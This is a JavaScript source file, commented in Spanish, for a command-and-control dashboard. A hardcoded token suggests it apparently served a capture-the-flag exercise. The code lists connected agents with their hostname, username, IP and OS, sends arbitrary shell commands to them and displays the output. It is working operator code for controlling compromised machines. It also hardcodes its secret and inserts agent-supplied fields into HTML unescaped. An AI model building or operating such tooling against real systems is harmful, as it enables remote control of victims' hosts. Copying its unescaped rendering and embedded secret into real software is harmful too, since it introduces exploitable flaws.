// Dashboard JavaScript - Polling de agents y envío de comandos
const AUTH_TOKEN = 'supersecret-ctf-token';
const API_BASE = '';
const POLL_INTERVAL = 5000; // 5 segundos

// Almacén de resultados por agent
const agentResults = {};

// Obtener agents del servidor
async function fetchAgents() {
    try {
        const response = await fetch(`${API_BASE}/agents`, {
            headers: { 'X-Auth-Token': AUTH_TOKEN }
        });
        if (!response.ok) throw new Error('Failed to fetch agents');
        return await response.json();
    } catch (error) {
        console.error('Error fetching agents:', error);
        return null;
    }
}

// Enviar comando a un agent
async function sendCommand(agentId, command) {
    try {
        const response = await fetch(`${API_BASE}/task/${agentId}`, {
            method: 'POST',
            headers: {
                'X-Auth-Token': AUTH_TOKEN,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ command })
        });
        if (!response.ok) {
            const data = await response.json();
            throw new Error(data.error || data.reason || 'Failed to send command');
        }
        return await response.json();
    } catch (error) {
        console.error('Error sending command:', error);
        throw error;
    }
}

// Obtener resultados de un agent
async function fetchResults(agentId) {
    try {
        const response = await fetch(`${API_BASE}/results/${agentId}`, {
            headers: { 'X-Auth-Token': AUTH_TOKEN }
        });
        if (!response.ok) throw new Error('Failed to fetch results');
        return await response.json();
    } catch (error) {
        console.error('Error fetching results:', error);
        return null;
    }
}

// Calcular tiempo desde último visto
function timeAgo(timestamp) {
    const seconds = Math.floor(Date.now() / 1000 - timestamp);
    if (seconds < 60) return `${seconds}s ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    return `${Math.floor(seconds / 3600)}h ago`;
}

// Renderizar un agent card
function renderAgent(agent) {
    const isOnline = agent.status === 'online';
    const result = agentResults[agent.agent_id];

    return `
        <div class="agent-card ${isOnline ? '' : 'offline'}">
            <div class="agent-header">
                <span class="agent-id">${agent.agent_id}</span>
                <span class="agent-status ${agent.status}">${agent.status}</span>
            </div>
            <div class="agent-info">
                <div>
                    <label>Hostname</label>
                    <span>${agent.hostname}</span>
                </div>
                <div>
                    <label>Username</label>
                    <span>${agent.username}</span>
                </div>
                <div>
                    <label>IP</label>
                    <span>${agent.ip}</span>
                </div>
                <div>
                    <label>OS</label>
                    <span>${agent.os}</span>
                </div>
                <div>
                    <label>Last Seen</label>
                    <span>${timeAgo(agent.last_seen)}</span>
                </div>
            </div>
            <div class="agent-commands">
                <input type="text"
                       id="cmd-${agent.agent_id}"
                       placeholder="Enter command (whoami, ls, cat, ps...)"
                       onkeypress="if(event.key==='Enter') executeCommand('${agent.agent_id}')">
                <button onclick="executeCommand('${agent.agent_id}')">Send</button>
                <button onclick="refreshResults('${agent.agent_id}')" style="background: #666;">Refresh</button>
            </div>
            <div class="agent-result ${result ? 'visible' : ''} ${result?.error ? 'error' : 'success'}"
                 id="result-${agent.agent_id}">
                ${result ? (result.error || result.output || 'No output') : ''}
            </div>
        </div>
    `;
}

// Actualizar dashboard
async function updateDashboard() {
    const data = await fetchAgents();
    if (!data) return;

    const agents = data.agents || [];
    const online = agents.filter(a => a.status === 'online').length;
    const offline = agents.length - online;

    // Update stats
    document.getElementById('total-agents').textContent = agents.length;
    document.getElementById('online-agents').textContent = online;
    document.getElementById('offline-agents').textContent = offline;

    // Update agents list
    const container = document.getElementById('agents-list');
    if (agents.length === 0) {
        container.innerHTML = '<p class="loading">No agents connected</p>';
    } else {
        container.innerHTML = agents.map(renderAgent).join('');
    }
}

// Ejecutar comando
async function executeCommand(agentId) {
    const input = document.getElementById(`cmd-${agentId}`);
    const command = input.value.trim();
    if (!command) return;

    const resultDiv = document.getElementById(`result-${agentId}`);
    resultDiv.className = 'agent-result visible';
    resultDiv.textContent = 'Sending command...';

    try {
        await sendCommand(agentId, command);
        resultDiv.textContent = 'Command sent. Waiting for result...';
        input.value = '';

        // Esperar 2 segundos y refrescar resultados
        setTimeout(() => refreshResults(agentId), 2000);
    } catch (error) {
        resultDiv.className = 'agent-result visible error';
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

// Refrescar resultados de un agent
async function refreshResults(agentId) {
    const data = await fetchResults(agentId);
    const resultDiv = document.getElementById(`result-${agentId}`);

    if (data && data.results && data.results.length > 0) {
        // Obtener el último resultado
        const latest = data.results[data.results.length - 1];
        agentResults[agentId] = { output: latest.output };
        resultDiv.className = 'agent-result visible success';
        resultDiv.textContent = latest.output;
    } else {
        agentResults[agentId] = { output: 'No results yet' };
        resultDiv.className = 'agent-result visible';
        resultDiv.textContent = 'No results yet';
    }
}

// Iniciar polling
function init() {
    updateDashboard();
    setInterval(updateDashboard, POLL_INTERVAL);
}

// Start when DOM is ready
document.addEventListener('DOMContentLoaded', init);
